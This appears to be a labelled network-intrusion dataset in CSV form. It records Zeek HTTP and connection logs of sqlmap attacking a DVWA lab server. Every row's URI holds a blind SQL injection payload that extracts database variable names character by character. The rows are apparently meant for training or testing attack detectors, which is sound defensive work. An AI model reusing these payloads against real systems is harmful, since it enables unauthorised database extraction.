ts_x,uid,id.orig_h_x,id.orig_p_x,id.resp_h_x,id.resp_p_x,proto,service,duration_x,orig_bytes,resp_bytes,conn_state,local_orig_x,local_resp,missed_bytes,history,orig_pkts,orig_ip_bytes,resp_pkts,resp_ip_bytes,tunnel_parents,ip_proto,ts_y,trans_depth,method,host,uri,referrer,version,user_agent,origin,request_body_len,response_body_len,status_code,status_msg,info_code,info_msg,tags,username,password,proxied,orig_fuids,orig_filenames,orig_mime_types,resp_fuids,resp_filenames,resp_mime_types,ts,fuid,source,depth,analyzers,mime_type,filename,duration_y,local_orig_y,is_orig,seen_bytes,total_bytes,missing_bytes,overflow_bytes,timedout,parent_fuid,md5,sha1,sha256,extracted,extracted_cutoff,extracted_size,attack_cat,label
1761395931,CTsceU1miuh2WIYWI,10.0.0.85,34184,10.0.0.88,80,tcp,http,0.028792,641,1729,SF,T,T,1729,ShADacgfF,5,909,4,216,-,6,1761395931.0,1.0,POST,10.0.0.88,"/DVWA/vulnerabilities/sqli/?id=111' OR NOT ORD(MID((SELECT IFNULL(CAST(VARIABLE_VALUE AS NCHAR),0x20) FROM information_schema.GLOBAL_VARIABLES ORDER BY VARIABLE_NAME LIMIT 485,1),3,1))>69-- kzik&Submit=Submit",http://10.0.0.88/DVWA/vulnerabilities/sqli/,-,sqlmap/1.9.10.5#dev (https://sqlmap.org),-,0.0,0.0,-,-,-,-,(empty),-,-,-,-,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,sql,1
1761395929,CdCIEP1ymhTcClHCYi,10.0.0.85,33264,10.0.0.88,80,tcp,http,0.026076,641,1938,SF,T,T,1938,ShADacgfF,5,909,4,216,-,6,1761395929.0,1.0,POST,10.0.0.88,"/DVWA/vulnerabilities/sqli/?id=111' OR NOT ORD(MID((SELECT IFNULL(CAST(VARIABLE_NAME AS NCHAR),0x20) FROM information_schema.GLOBAL_VARIABLES ORDER BY VARIABLE_NAME LIMIT 485,1),21,1))>72-- xPpn&Submit=Submit",http://10.0.0.88/DVWA/vulnerabilities/sqli/,-,sqlmap/1.9.10.5#dev (https://sqlmap.org),-,0.0,0.0,-,-,-,-,(empty),-,-,-,-,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,sql,1
1761395932,CxfNWA4h2PFaesvMl4,10.0.0.85,38222,10.0.0.88,80,tcp,http,0.03631,640,1729,SF,T,T,1729,ShADacfgF,5,908,4,216,-,6,1761395932.0,1.0,POST,10.0.0.88,"/DVWA/vulnerabilities/sqli/?id=111' OR NOT ORD(MID((SELECT IFNULL(CAST(VARIABLE_NAME AS NCHAR),0x20) FROM information_schema.GLOBAL_VARIABLES ORDER BY VARIABLE_NAME LIMIT 486,1),7,1))>64-- nhDV&Submit=Submit",http://10.0.0.88/DVWA/vulnerabilities/sqli/,-,sqlmap/1.9.10.5#dev (https://sqlmap.org),-,0.0,0.0,-,-,-,-,(empty),-,-,-,-,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,sql,1
1761395929,CkUjZotqWxvm1riG1,10.0.0.85,33472,10.0.0.88,80,tcp,http,0.017357,641,1939,SF,T,T,1939,ShADacfgF,5,909,4,216,-,6,1761395929.0,1.0,POST,10.0.0.88,"/DVWA/vulnerabilities/sqli/?id=111' OR NOT ORD(MID((SELECT IFNULL(CAST(VARIABLE_NAME AS NCHAR),0x20) FROM information_schema.GLOBAL_VARIABLES ORDER BY VARIABLE_NAME LIMIT 485,1),26,1))>96-- xPpn&Submit=Submit",http://10.0.0.88/DVWA/vulnerabilities/sqli/,-,sqlmap/1.9.10.5#dev (https://sqlmap.org),-,0.0,0.0,-,-,-,-,(empty),-,-,-,-,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,sql,1
1761395929,C0TXwH2L46QKDITc16,10.0.0.85,33240,10.0.0.88,80,tcp,http,0.067043,641,1729,SF,T,T,1729,ShADacgfF,5,909,4,216,-,6,1761395929.0,1.0,POST,10.0.0.88,"/DVWA/vulnerabilities/sqli/?id=111' OR NOT ORD(MID((SELECT IFNULL(CAST(VARIABLE_NAME AS NCHAR),0x20) FROM information_schema.GLOBAL_VARIABLES ORDER BY VARIABLE_NAME LIMIT 485,1),23,1))>64-- xPpn&Submit=Submit",http://10.0.0.88/DVWA/vulnerabilities/sqli/,-,sqlmap/1.9.10.5#dev (https://sqlmap.org),-,0.0,0.0,-,-,-,-,(empty),-,-,-,-,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,sql,1
1761395932,C3gSIH2tCqHKhGTnn1,10.0.0.85,38300,10.0.0.88,80,tcp,http,0.042567,640,1729,SF,T,T,1729,ShADacgfF,5,908,4,216,-,6,1761395932.0,1.0,POST,10.0.0.88,"/DVWA/vulnerabilities/sqli/?id=111' OR NOT ORD(MID((SELECT IFNULL(CAST(VARIABLE_NAME AS NCHAR),0x20) FROM information_schema.GLOBAL_VARIABLES ORDER BY VARIABLE_NAME LIMIT 486,1),5,1))>80-- nhDV&Submit=Submit",http://10.0.0.88/DVWA/vulnerabilities/sqli/,-,sqlmap/1.9.10.5#dev (https://sqlmap.org),-,0.0,0.0,-,-,-,-,(empty),-,-,-,-,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,sql,1
1761395932,CuJ46143IuYyxBokfl,10.0.0.85,34290,10.0.0.88,80,tcp,http,0.03517,657,1948,SF,T,T,1948,ShADacgfF,5,925,4,216,-,6,1761395932.0,1.0,POST,10.0.0.88,"/DVWA/vulnerabilities/sqli/?id=111' OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(VARIABLE_NAME) AS NCHAR),0x20) FROM information_schema.GLOBAL_VARIABLES ORDER BY VARIABLE_NAME LIMIT 486,1),3,1))>51-- nhDV&Submit=Submit",http://10.0.0.88/DVWA/vulnerabilities/sqli/,-,sqlmap/1.9.10.5#dev (https://sqlmap.org),-,0.0,0.0,-,-,-,-,(empty),-,-,-,-,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,sql,1
1761395932,CCUqXhGdd3Y20kaR8,10.0.0.85,38108,10.0.0.88,80,tcp,http,0.017787,640,1729,SF,T,T,1729,ShADacfgF,5,908,4,216,-,6,1761395932.0,1.0,POST,10.0.0.88,"/DVWA/vulnerabilities/sqli/?id=111' OR NOT ORD(MID((SELECT IFNULL(CAST(VARIABLE_NAME AS NCHAR),0x20) FROM information_schema.GLOBAL_VARIABLES ORDER BY VARIABLE_NAME LIMIT 486,1),3,1))>72-- nhDV&Submit=Submit",http://10.0.0.88/DVWA/vulnerabilities/sqli/,-,sqlmap/1.9.10.5#dev (https://sqlmap.org),-,0.0,0.0,-,-,-,-,(empty),-,-,-,-,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,sql,1
1761395930,C5lyIJ21xGzvrw9N9l,10.0.0.85,33598,10.0.0.88,80,tcp,http,0.029857,641,1937,SF,T,T,1937,ShADacfgF,5,909,4,216,-,6,1761395930.0,1.0,POST,10.0.0.88,"/DVWA/vulnerabilities/sqli/?id=111' OR NOT ORD(MID((SELECT IFNULL(CAST(VARIABLE_NAME AS NCHAR),0x20) FROM information_schema.GLOBAL_VARIABLES ORDER BY VARIABLE_NAME LIMIT 485,1),25,1))>89-- xPpn&Submit=Submit",http://10.0.0.88/DVWA/vulnerabilities/sqli/,-,sqlmap/1.9.10.5#dev (https://sqlmap.org),-,0.0,0.0,-,-,-,-,(empty),-,-,-,-,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,sql,1
1761395929,CVss8u1emtjtGNYZBe,10.0.0.85,33464,10.0.0.88,80,tcp,http,0.036185,641,1939,SF,T,T,1939,ShADacfgF,5,909,4,216,-,6,1761395929.0,1.0,POST,10.0.0.88,"/DVWA/vulnerabilities/sqli/?id=111' OR NOT ORD(MID((SELECT IFNULL(CAST(VARIABLE_NAME AS NCHAR),0x20) FROM information_schema.GLOBAL_VARIABLES ORDER BY VARIABLE_NAME LIMIT 485,1),24,1))>66-- xPpn&Submit=Submit",http://10.0.0.88/DVWA/vulnerabilities/sqli/,-,sqlmap/1.9.10.5#dev (https://sqlmap.org),-,0.0,0.0,-,-,-,-,(empty),-,-,-,-,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,sql,1
